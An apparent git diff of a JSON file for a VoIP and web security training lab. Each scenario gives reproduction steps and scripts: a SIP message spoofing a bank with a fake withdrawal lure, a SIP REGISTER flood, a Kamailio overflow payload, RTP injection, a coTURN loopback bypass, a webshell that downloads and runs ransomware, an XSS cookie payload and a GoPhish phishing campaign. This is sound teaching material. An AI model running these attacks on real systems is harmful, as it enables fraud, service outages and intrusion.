@@ -9,7 +9,17 @@
     "attacker",
     "freeswitch"
   ],
-  "steps": "### How to reproduce the issue\nThe first step is to start the virtual machine by clicking the button above.\n\nFor the attack, the Linphone application is used and a user must be registered. FreeSWITCH provides default users ranging from <b>1000</b> to <b>1020</b> (it is recommended to use one of these).\nThe username corresponds to the chosen value, while the password is <b>1234</b>.\nTo complete the registration, the SIP server must be specified. The IP address of the VM hosting the containers is used:\n\n![registration](/labs/1_2_sip_spoofing_dos_freeswitch/img/1001.png)\n\nOnce the <i>attacker</i> container is running, it can be accessed with:\n```bash\ndocker exec -it attacker sh\n```\nand the python script can be executed:\n```bash\npython3 spoofing.py <IP_VM> <clientSIP>\n```\nwhere:\n- `IP_VM` is the IP address of the VM (FreeSWITCH container);\n- `clientSIP` is the number of the SIP client (linphone).\n\nThe script used is:\n```python\nimport sys, socket, random, string\n\nUDP_IP = sys.argv[1]\nUDP_PORT = 5060\next = sys.argv[2]\nrand = ''.join(random.choice(string.ascii_lowercase) for i in range(8))\nmsg=\"MESSAGE sip:%s@%s SIP/2.0\\r\\n\" % (ext, UDP_IP)\nmsg+=\"Via: SIP/2.0/UDP 192.168.2.19:10096;rport;branch=z9hG4bK-%s\\r\\n\" % rand\nmsg+=\"Max-Forwards: 70\\r\\n\"\nmsg+=\"From: <sip:UniCredit@%s>;tag=%s\\r\\n\" %(UDP_IP, rand)\nmsg+=\"To: <sip:%s@%s>\\r\\n\" %(ext, UDP_IP)\nmsg+=\"Call-ID: %s\\r\\n\" % rand\nmsg+=\"CSeq: 1 MESSAGE\\r\\n\"\nmsg+=\"Contact: <sip:UniCredit@192.168.2.19:10060;transport=udp>\\r\\n\"\nmsg+=\"Content-Type: text/plain\\r\\n\"\nmsg+=\"Content-Length: 81\\r\\n\\r\\n\"\nmsg+=\"A withdrawal of €2,000 has been made.\\nFor more information, call 321 757 75 11.\"\n\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nsock.sendto(msg.encode(), (UDP_IP, UDP_PORT))\n```\n\nBecause the server does not verify that the sender is registered (i.e. ```auth-messages = false``` by default), the spoofed message will be accepted — resulting in the spoofed user (e.g. ```UniCredit```) appearing to send the message.\n\nThe following message will appear:\n\n![spoofing](/labs/1_2_sip_spoofing_dos_freeswitch/img/message_unicredit.png)"
+  "steps": "### How to reproduce the issue\nThe first step is to start the virtual machine by clicking the button above.\n\nFor the attack, the Linphone application is used and a user must be registered. FreeSWITCH provides default users ranging from <b>1000</b> to <b>1020</b> (it is recommended to use one of these).\nThe username corresponds to the chosen value, while the password is <b>1234</b>.\nTo complete the registration, the SIP server must be specified. The IP address of the VM hosting the containers is used:\n\n![registration](/labs/1_2_sip_spoofing_dos_freeswitch/img/1001.png)\n\nOnce the <i>attacker</i> container is running, it can be accessed with:\n```bash\ndocker exec -it attacker sh\n```\nand the python script can be executed:\n```bash\npython3 spoofing.py <IP_VM> <clientSIP>\n```\nwhere:\n- `IP_VM` is the IP address of the VM (FreeSWITCH container);\n- `clientSIP` is the number of the SIP client (linphone).\n\nThe script used is:\n```python\nimport sys, socket, random, string\n\nUDP_IP = sys.argv[1]\nUDP_PORT = 5060\next = sys.argv[2]\nrand = ''.join(random.choice(string.ascii_lowercase) for i in range(8))\nmsg=\"MESSAGE sip:%s@%s SIP/2.0\\r\\n\" % (ext, UDP_IP)\nmsg+=\"Via: SIP/2.0/UDP 192.168.2.19:10096;rport;branch=z9hG4bK-%s\\r\\n\" % rand\nmsg+=\"Max-Forwards: 70\\r\\n\"\nmsg+=\"From: <sip:UniCredit@%s>;tag=%s\\r\\n\" %(UDP_IP, rand)\nmsg+=\"To: <sip:%s@%s>\\r\\n\" %(ext, UDP_IP)\nmsg+=\"Call-ID: %s\\r\\n\" % rand\nmsg+=\"CSeq: 1 MESSAGE\\r\\n\"\nmsg+=\"Contact: <sip:UniCredit@192.168.2.19:10060;transport=udp>\\r\\n\"\nmsg+=\"Content-Type: text/plain\\r\\n\"\nmsg+=\"Content-Length: 81\\r\\n\\r\\n\"\nmsg+=\"A withdrawal of €2,000 has been made.\\nFor more information, call 321 757 75 11.\"\n\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nsock.sendto(msg.encode(), (UDP_IP, UDP_PORT))\n```\n\nBecause the server does not verify that the sender is registered (i.e. ```auth-messages = false``` by default), the spoofed message will be accepted — resulting in the spoofed user (e.g. ```UniCredit```) appearing to send the message.\n\nThe following message will appear:\n\n![spoofing](/labs/1_2_sip_spoofing_dos_freeswitch/img/message_unicredit.png)",
+  "room": {
+    "name": "SIP Spoofing room",
+    "chats": [{
+      "content": "Ciao, come va?",
+      "user": "Pippo"
+    }, {
+      "content": "Bene te?",
+      "user": "Pippozzo"
+    }]
+  }
 },
 {
   "_id": {
@@ -22,7 +32,14 @@
     "attacker",
     "freeswitch"
   ],
-  "steps": "### How to reproduce the issue\nThe first step is to start the virtual machine by clicking the button above.\n\nFrom the attacker container, run:\n```bash\npython3 dos-sipflood.py <IP_VM>\n```\nThe script below repeatedly sends SIP REGISTER (or similar) requests to the FreeSWITCH server:\n```python\nimport socket, string, random, sys\n\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\ncseq = 1\nUDP_IP = sys.argv[1]\nUDP_PORT = 5060\n\nwhile True:\n    r = ''.join(random.choice(string.ascii_lowercase) for i in range(10))\n    \n    msg = \"REGISTER sip:%s SIP/2.0\\r\\n\" % (UDP_IP, )\n    msg += \"Via: SIP/2.0/UDP %s:46786;rport;branch=z9hG4bK-%s\\r\\n\" % (UDP_IP, r, )\n    msg += \"Max-Forwards: 70\\r\\n\"\n    msg += \"From: <sip:98647499@%s>;tag=%s\\r\\n\" % (UDP_IP, r, )\n    msg += \"To: <sip:98647499@%s>\\r\\n\" % (UDP_IP, )\n    msg += \"Call-ID: %s\\r\\n\" % (r, )\n    msg += \"CSeq: %s REGISTER\\r\\n\" % (cseq, )\n    msg += \"Contact: <sip:98647499@%s:46786;transport=udp>\\r\\n\" % (UDP_IP, )\n    msg += \"Expires: 60\\r\\n\"\n    msg += \"Content-Length: 0\\r\\n\"\n    msg += \"\\r\\n\" \n\n    sock.sendto(msg.encode(), (UDP_IP, UDP_PORT))\n\n    cseq += 1\n```\nBecause the server must allocate resources to process each registration, memory is exhausted and the FreeSWITCH container crashes. \n\nYou can observe this by monitoring the container with `docker stats`: after some time memory consumption grows until it hits the limit, then the container terminates."
+  "steps": "### How to reproduce the issue\nThe first step is to start the virtual machine by clicking the button above.\n\nFrom the attacker container, run:\n```bash\npython3 dos-sipflood.py <IP_VM>\n```\nThe script below repeatedly sends SIP REGISTER (or similar) requests to the FreeSWITCH server:\n```python\nimport socket, string, random, sys\n\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\ncseq = 1\nUDP_IP = sys.argv[1]\nUDP_PORT = 5060\n\nwhile True:\n    r = ''.join(random.choice(string.ascii_lowercase) for i in range(10))\n    \n    msg = \"REGISTER sip:%s SIP/2.0\\r\\n\" % (UDP_IP, )\n    msg += \"Via: SIP/2.0/UDP %s:46786;rport;branch=z9hG4bK-%s\\r\\n\" % (UDP_IP, r, )\n    msg += \"Max-Forwards: 70\\r\\n\"\n    msg += \"From: <sip:98647499@%s>;tag=%s\\r\\n\" % (UDP_IP, r, )\n    msg += \"To: <sip:98647499@%s>\\r\\n\" % (UDP_IP, )\n    msg += \"Call-ID: %s\\r\\n\" % (r, )\n    msg += \"CSeq: %s REGISTER\\r\\n\" % (cseq, )\n    msg += \"Contact: <sip:98647499@%s:46786;transport=udp>\\r\\n\" % (UDP_IP, )\n    msg += \"Expires: 60\\r\\n\"\n    msg += \"Content-Length: 0\\r\\n\"\n    msg += \"\\r\\n\" \n\n    sock.sendto(msg.encode(), (UDP_IP, UDP_PORT))\n\n    cseq += 1\n```\nBecause the server must allocate resources to process each registration, memory is exhausted and the FreeSWITCH container crashes. \n\nYou can observe this by monitoring the container with `docker stats`: after some time memory consumption grows until it hits the limit, then the container terminates.",
+  "room": {
+    "name": "Denial of Service room",
+    "chats": [{
+      "content": "Qualcuno ha risolto lo scenario?",
+      "user": "Andrea"
+    }]
+  }
 },
 {
   "_id": {
@@ -35,7 +52,17 @@
     "kamailio",
     "sipp101"
   ],
-  "steps": "### How to reproduce the issue\nThe first step is to start the virtual machine by clicking the button above.\n\nThen, access the <i>sipp101</i> container:\n```bash\ndocker exec -it sipp101 bash\n```\nThe malformed message is sent using:\n```bash\nsipp -sf /sipp/xml/overflow.xml <IP_VM> -m 1\n```\nwhere:\n- `-sf /sipp/xml/overflow.xml` indicates the XML file containing the malformed SIP Register request;\n- `IP_VM` is the IP address of the VM hosting the containers (Kamailio container);\n- `-m 1` specifies that only one message is sent.\n\nThe script used is:\n\n```xml\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE scenario SYSTEM \"sipp.dtd\">\n<scenario name=\"overflow\">\n  <send>\n    <![CDATA[\n    REGISTER sip:[remote_ip]:[remote_port] SIP/2.0\n    Via: SIP/2.0/TCP 127.0.0.1:53497;branch=z9hG4bK0aa9ae17-25cb-4c3a-abc9-979ce5bee394\n    To: <sip:1@[remote_ip]:[remote_port]>\n    From: Test <sip:2@localhost:5060>;tag=bk1RdYaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaRg\n    Call-ID: 8b113457-c6a6-456a-be68-606686d93c38\n    Contact: sip:1@127.0.0.1:53497\n    Max-Forwards: 70\n    CSeq: 10086 REGISTER\n    User-Agent: go SIP fuzzer/1\n    Content-Length: 0\n    ]]>\n  </send>\n  \n</scenario>\n```\nIf a REGISTER request contains a malformed or excessively long  ```branch``` parameter or ```From tag``` — fields that are not properly bounded in vulnerable versions — the call to ```tmx_check_pretran()``` will trigger an off-by-one heap-based buffer overflow, causing a segmentation fault and crashing the container."
+  "steps": "### How to reproduce the issue\nThe first step is to start the virtual machine by clicking the button above.\n\nThen, access the <i>sipp101</i> container:\n```bash\ndocker exec -it sipp101 bash\n```\nThe malformed message is sent using:\n```bash\nsipp -sf /sipp/xml/overflow.xml <IP_VM> -m 1\n```\nwhere:\n- `-sf /sipp/xml/overflow.xml` indicates the XML file containing the malformed SIP Register request;\n- `IP_VM` is the IP address of the VM hosting the containers (Kamailio container);\n- `-m 1` specifies that only one message is sent.\n\nThe script used is:\n\n```xml\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE scenario SYSTEM \"sipp.dtd\">\n<scenario name=\"overflow\">\n  <send>\n    <![CDATA[\n    REGISTER sip:[remote_ip]:[remote_port] SIP/2.0\n    Via: SIP/2.0/TCP 127.0.0.1:53497;branch=z9hG4bK0aa9ae17-25cb-4c3a-abc9-979ce5bee394\n    To: <sip:1@[remote_ip]:[remote_port]>\n    From: Test <sip:2@localhost:5060>;tag=bk1RdYaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaRg\n    Call-ID: 8b113457-c6a6-456a-be68-606686d93c38\n    Contact: sip:1@127.0.0.1:53497\n    Max-Forwards: 70\n    CSeq: 10086 REGISTER\n    User-Agent: go SIP fuzzer/1\n    Content-Length: 0\n    ]]>\n  </send>\n  \n</scenario>\n```\nIf a REGISTER request contains a malformed or excessively long  ```branch``` parameter or ```From tag``` — fields that are not properly bounded in vulnerable versions — the call to ```tmx_check_pretran()``` will trigger an off-by-one heap-based buffer overflow, causing a segmentation fault and crashing the container.",
+  "room": {
+    "name": "Heap Overflow room",
+    "chats": [{
+      "content": "Qualcuno ha risolto lo scenario?",
+      "user": "Mario"
+    }, {
+      "content": "Io",
+      "user": "Peppe"
+    }]
+  }
 },
 {
   "_id": {
@@ -49,7 +76,17 @@
     "sippts",
     "wireshark"
   ],
-  "steps": "### How to reproduce the issue\nThe first step is to start the virtual machine by clicking the button above.\n\nFor this scenario, the Linphone application must be used to simulate the SIP clients.\nUsers <b>7001</b> e <b>7002</b> are registered. Below is the registration of user 7001 (the registration procedure for 7002 is analogous):\n\n![registration](/labs/4_rtp_bleed_injection_asterisk/img/7001_registration.png)\n\nThe Wireshark container is started to observe the port used for RTP traffic (in the example, RTP uses ports between 10000 and 10099). \n\nTo run Wireshark with a graphical interface from the container, you need to allow local root users to access the host’s display. This can be done with:\n```bash\nxhost +local:root\n```\nThen the user can use the following command:\n```bash\ndocker exec -it wireshark wireshark\n```\nThe network interface is selected, and a call is initiated between Linphone 7001 and 7002.\n\nAccess the <i>sippts</i> container:\n```bash\ndocker exec -it sippts bash\n```\nand run the script:\n```bash\nsippts rtpbleedinject -i <IP_VM> -r <port_number> -f audio.wav\n```\nwhere:\n- ```rtpbleedinject``` indicates the type of attack, namely RTP Injection;\n- ```-i <IP_VM>``` represents the IP address of the VM running the Asterisk server;\n-```-r <port_number>``` represents the IP address of the VM running the Asterisk server;\n- ```-f audio.wav``` indicates the audio file injected into the conversation.\n\nIn the vulnerable versions, if ```nat = yes```, the RTP proxies can automatically learn the attacker's IP and port and send the RTP legitimate traffic to him. After that, the attacker can send a malisous audio and degradeted the connection."
+  "steps": "### How to reproduce the issue\nThe first step is to start the virtual machine by clicking the button above.\n\nFor this scenario, the Linphone application must be used to simulate the SIP clients.\nUsers <b>7001</b> e <b>7002</b> are registered. Below is the registration of user 7001 (the registration procedure for 7002 is analogous):\n\n![registration](/labs/4_rtp_bleed_injection_asterisk/img/7001_registration.png)\n\nThe Wireshark container is started to observe the port used for RTP traffic (in the example, RTP uses ports between 10000 and 10099). \n\nTo run Wireshark with a graphical interface from the container, you need to allow local root users to access the host’s display. This can be done with:\n```bash\nxhost +local:root\n```\nThen the user can use the following command:\n```bash\ndocker exec -it wireshark wireshark\n```\nThe network interface is selected, and a call is initiated between Linphone 7001 and 7002.\n\nAccess the <i>sippts</i> container:\n```bash\ndocker exec -it sippts bash\n```\nand run the script:\n```bash\nsippts rtpbleedinject -i <IP_VM> -r <port_number> -f audio.wav\n```\nwhere:\n- ```rtpbleedinject``` indicates the type of attack, namely RTP Injection;\n- ```-i <IP_VM>``` represents the IP address of the VM running the Asterisk server;\n- ```-r <port_number>``` represents the IP address of the VM running the Asterisk server;\n- ```-f audio.wav``` indicates the audio file injected into the conversation.\n\nIn the vulnerable versions, if ```nat = yes```, the RTP proxies can automatically learn the attacker's IP and port and send the RTP legitimate traffic to him. After that, the attacker can send a malisous audio and degradeted the connection.",
+  "room": {
+    "name": "RTP Injection room",
+    "chats": [{
+      "content": "Qualcuno ha risolto lo scenario?",
+      "user": "Mario"
+    }, {
+      "content": "Io",
+      "user": "Peppe"
+    }]
+  }
 },
 {
   "_id": {
@@ -63,7 +100,17 @@
     "stunner",
     "node_coturn"
   ],
-  "steps": "### How to reproduce the issue\nThe first step is to start the virtual machine by clicking the button above.\n\nThe behavior of the <i>coTURN</i> server is observed with:\n```bash\ndocker logs coturn --follow\n```\n\nAccess the <i>stunner</i> container:\n```bash\ndocker exec -it stunner sh\n```\nand create a socks5 proxy with:\n```bash\nstunner socks --turnserver 10.0.0.10:3478 --protocol tcp --username username1 --password password1 --listen 10.0.0.4:9999\n```\nThis command creates a `socks5` server connected to the TURN server (`turnserver`). It uses TCP as the protocol and the same credentials used to start the coTURN server; it listens on `10.0.0.4:9999`.\n\nA web server is created on the coTURN container on the loopback interface:\n```bash\npython3 -m http.server 8000 --bind ::1\n```\n\nBy performing a GET request to the server on the loopback interface through the proxy:\n```\ncurl -x socks5h://10.0.0.4:9999 http://127.0.0.1:8000\n```\nthe request is blocked (coTURN blocks requests toward loopback addresses). However, by using the IP `::1` or `::`, a communication can be established and the web services become accessible:\n```\ncurl -x socks5h://10.0.0.4:9999 http://[::1]:8000\ncurl -x socks5h://10.0.0.4:9999 http://[::]:8000\n\n```"
+  "steps": "### How to reproduce the issue\nThe first step is to start the virtual machine by clicking the button above.\n\nThe behavior of the <i>coTURN</i> server is observed with:\n```bash\ndocker logs coturn --follow\n```\n\nAccess the <i>stunner</i> container:\n```bash\ndocker exec -it stunner sh\n```\nand create a socks5 proxy with:\n```bash\nstunner socks --turnserver 10.0.0.10:3478 --protocol tcp --username username1 --password password1 --listen 10.0.0.4:9999\n```\nThis command creates a `socks5` server connected to the TURN server (`turnserver`). It uses TCP as the protocol and the same credentials used to start the coTURN server; it listens on `10.0.0.4:9999`.\n\nA web server is created on the coTURN container on the loopback interface:\n```bash\npython3 -m http.server 8000 --bind ::1\n```\n\nBy performing a GET request to the server on the loopback interface through the proxy:\n```\ncurl -x socks5h://10.0.0.4:9999 http://127.0.0.1:8000\n```\nthe request is blocked (coTURN blocks requests toward loopback addresses). However, by using the IP `::1` or `::`, a communication can be established and the web services become accessible:\n```\ncurl -x socks5h://10.0.0.4:9999 http://[::1]:8000\ncurl -x socks5h://10.0.0.4:9999 http://[::]:8000\n\n```",
+  "room": {
+    "name": "CoTURN Access Bypass room",
+    "chats": [{
+      "content": "Qualcuno ha risolto lo scenario?",
+      "user": "Mario"
+    }, {
+      "content": "Io",
+      "user": "Peppe"
+    }]
+  }
 },
 {
   "_id": {
@@ -75,7 +122,17 @@
   "images": [
     "node_socketiofile"
   ],
-  "steps": "### How to reproduce the issue\nThe first step is to start the virtual machine by clicking the button above.\n\nThe web page is accessed through a browser (```http://<IP_VM>:8080```).\n\nNext, the file ```webshell.js```is uploaded; once uploaded, a communication channel with the victim machine is established. This is possible because, in the vulnerable versions, the server doesn't check the file format and saves it of victime machine.\n\nAn attacker-controlled web server is then started, from which the file ```ransomware.py``` can be downloaded:\n```bash\npython3 -m http.server 9000\n```\n\nFrom the browser, the file can be downloaded using the following HTTP request:\n```bash\nhttp://<IP_VM>:8080/webshell.js/?cmd=wget http://<IP_VM>:9000/ransomware.py\n```\nThe file is then moved into the appropriate directory:\n```bash\nhttp://<IP_VM>:8080/webshell.js/?cmd=mv ransomware.py ./public/\n```\nFinally, the attack is launched:\n```bash\nhttp://<IP_VM>:8080/webshell.js/?cmd=python3 ./public/ransomware.py\n```\nThe effect is the encryption of all files contained in the ```public``` directory of the web server."
+  "steps": "### How to reproduce the issue\nThe first step is to start the virtual machine by clicking the button above.\n\nThe web page is accessed through a browser (```http://<IP_VM>:8080```).\n\nNext, the file ```webshell.js```is uploaded; once uploaded, a communication channel with the victim machine is established. This is possible because, in the vulnerable versions, the server doesn't check the file format and saves it of victime machine.\n\nAn attacker-controlled web server is then started, from which the file ```ransomware.py``` can be downloaded:\n```bash\npython3 -m http.server 9000\n```\n\nFrom the browser, the file can be downloaded using the following HTTP request:\n```bash\nhttp://<IP_VM>:8080/webshell.js/?cmd=wget http://<IP_VM>:9000/ransomware.py\n```\nThe file is then moved into the appropriate directory:\n```bash\nhttp://<IP_VM>:8080/webshell.js/?cmd=mv ransomware.py ./public/\n```\nFinally, the attack is launched:\n```bash\nhttp://<IP_VM>:8080/webshell.js/?cmd=python3 ./public/ransomware.py\n```\nThe effect is the encryption of all files contained in the ```public``` directory of the web server.",
+  "room": {
+    "name": "Remote Code Execution room",
+    "chats": [{
+      "content": "Qualcuno ha risolto lo scenario?",
+      "user": "Mario"
+    }, {
+      "content": "Io",
+      "user": "Peppe"
+    }]
+  }
 },
 {
   "_id": {
@@ -88,7 +145,17 @@
     "vdoninja",
     "node_mongoose"
   ],
-  "steps": "### How to reproduce the issue\nThe first step is to start the virtual machine by clicking the button above.\n\nAssuming that MongoDB Atlas is used as the NoSQL database.\n\nTo allow the container to access the database, set the allowed IP address to ```0.0.0.0/0```.\n\nThe web page is accessed through a browser at: ```https://<IP_VM>```. In the vulnerable versions, the ```_bsontype``` attribute is ignored by server, and therefore by entering any username or password, access is granted.\n\nAfter being redirected to: ```https://<IP_VM>:8080```, a new attack can be performed. Using:\n```bash\nhttps://<IP_VM>:8080/examples/control.html?room=<img src=x onerror=alert(document.cookie)>\n```\nthe page’s cookies are obtained.\n\nFor the vulnerable versions, there is no sanification of this particular input."
+  "steps": "### How to reproduce the issue\nThe first step is to start the virtual machine by clicking the button above.\n\nAssuming that MongoDB Atlas is used as the NoSQL database.\n\nTo allow the container to access the database, set the allowed IP address to ```0.0.0.0/0```.\n\nThe web page is accessed through a browser at: ```https://<IP_VM>```. In the vulnerable versions, the ```_bsontype``` attribute is ignored by server, and therefore by entering any username or password, access is granted.\n\nAfter being redirected to: ```https://<IP_VM>:8080```, a new attack can be performed. Using:\n```bash\nhttps://<IP_VM>:8080/examples/control.html?room=<img src=x onerror=alert(document.cookie)>\n```\nthe page’s cookies are obtained.\n\nFor the vulnerable versions, there is no sanification of this particular input.",
+  "room": {
+    "name": "NoSQLi and XSS room",
+    "chats": [{
+      "content": "Qualcuno ha risolto lo scenario?",
+      "user": "Mario"
+    }, {
+      "content": "Io",
+      "user": "Peppe"
+    }]
+  }
 },
 {
   "_id": {
@@ -100,5 +167,15 @@
   "images:": [
     "node_firefox"
   ],
-  "steps": "### How to reproduce the issue\nThe first step is to start the virtual machine by clicking the button above.\n\nThe GoPhish framework is used to create a phishing campaign. First, the sender profile is defined:\n\n![sending_profile](/labs/9_firefox_access_cam_web/img/sending_profiles.png)\n\nNext, the landing page is configured (that is, the page to which the user is redirected after clicking the button):\n\n![landing_page](/labs/9_firefox_access_cam_web/img/landing_page.png)\n\nThe email template is defined:\n\n![email_template](/labs/9_firefox_access_cam_web/img/email_template.png)\n\nThe group of users targeted by the message is specified:\n\n![group](/labs/9_firefox_access_cam_web/img/users_group.png)\n\nFinally, a campaign is created and launched:\n\n![campaign](/labs/9_firefox_access_cam_web/img/campaign.png)\n\nThe effect is that the email is delivered to the user:\n\n![email](/labs/9_firefox_access_cam_web/img/email.png)\n\nThe user clicks the button and is redirected to the landing page:\n\n![login](/labs/9_firefox_access_cam_web/img/login_page.png)\n\nBy entering their credentials, the user is in fact providing them to the attacker:\n\n![details](/labs/9_firefox_access_cam_web/img/details.png)\n\nAt this point, the user is redirected to the attacker’s page, and by granting access to the webcam and microphone for what appears to be a conversation, they are effectively allowing the attacker to use these permissions on third-party pages. In the vulnerable versions, the browser retains granted permissions and applies them on third-party pages as well."
+  "steps": "### How to reproduce the issue\nThe first step is to start the virtual machine by clicking the button above.\n\nThe GoPhish framework is used to create a phishing campaign. First, the sender profile is defined:\n\n![sending_profile](/labs/9_firefox_access_cam_web/img/sending_profiles.png)\n\nNext, the landing page is configured (that is, the page to which the user is redirected after clicking the button):\n\n![landing_page](/labs/9_firefox_access_cam_web/img/landing_page.png)\n\nThe email template is defined:\n\n![email_template](/labs/9_firefox_access_cam_web/img/email_template.png)\n\nThe group of users targeted by the message is specified:\n\n![group](/labs/9_firefox_access_cam_web/img/users_group.png)\n\nFinally, a campaign is created and launched:\n\n![campaign](/labs/9_firefox_access_cam_web/img/campaign.png)\n\nThe effect is that the email is delivered to the user:\n\n![email](/labs/9_firefox_access_cam_web/img/email.png)\n\nThe user clicks the button and is redirected to the landing page:\n\n![login](/labs/9_firefox_access_cam_web/img/login_page.png)\n\nBy entering their credentials, the user is in fact providing them to the attacker:\n\n![details](/labs/9_firefox_access_cam_web/img/details.png)\n\nAt this point, the user is redirected to the attacker’s page, and by granting access to the webcam and microphone for what appears to be a conversation, they are effectively allowing the attacker to use these permissions on third-party pages. In the vulnerable versions, the browser retains granted permissions and applies them on third-party pages as well.",
+  "room": {
+    "name": "Firefox Permission Abuse room",
+    "chats": [{
+      "content": "Qualcuno ha risolto lo scenario?",
+      "user": "Mario"
+    }, {
+      "content": "Io",
+      "user": "Peppe"
+    }]
+  }
 }]
